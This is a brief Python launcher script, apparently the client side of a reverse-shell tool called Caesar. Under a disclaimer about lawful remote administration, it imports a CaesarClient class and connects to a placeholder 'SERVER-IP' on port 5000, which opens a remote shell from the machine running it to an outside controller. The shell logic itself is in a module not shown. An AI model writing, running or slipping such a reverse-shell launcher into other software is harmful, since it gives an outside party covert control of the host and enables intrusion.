#Created by Xand

#Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.


from caesar_client import CaesarClient


cr = CaesarClient("SERVER-IP", 5000)
cr.establish_connection()

